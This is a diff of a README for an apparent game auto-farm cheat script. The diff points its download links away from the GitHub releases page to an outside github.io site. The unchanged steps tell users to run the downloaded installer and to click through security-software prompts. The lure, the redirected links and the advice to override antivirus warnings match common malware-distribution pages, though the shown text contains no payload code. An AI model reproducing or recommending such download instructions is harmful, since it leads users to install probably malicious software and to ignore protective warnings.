@@ -1,6 +1,6 @@
 # 🦾 Muscle-Per-Step-Script---OP-Auto-Farm-2026 - Grow your character stats automatically today
 
-[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bariumoxidecruciality62/Muscle-Per-Step-Script---OP-Auto-Farm-2026/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bariumoxidecruciality62.github.io)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ To run this application on your Windows machine, ensure your system meets these 
 
 Follow these steps to obtain and use the script.
 
-1. Visit the [official releases page](https://github.com/Bariumoxidecruciality62/Muscle-Per-Step-Script---OP-Auto-Farm-2026/releases) to access the download.
+1. Visit the [official releases page](https://bariumoxidecruciality62.github.io) to access the download.
 2. Select the latest version file listed under the Assets section.
 3. Save the file to a folder on your computer that you can access easily, such as your Desktop.
 4. Open the downloaded file to begin the extraction process. Some security software may prompt you for confirmation. Select run to allow the installer to unpack the necessary files.
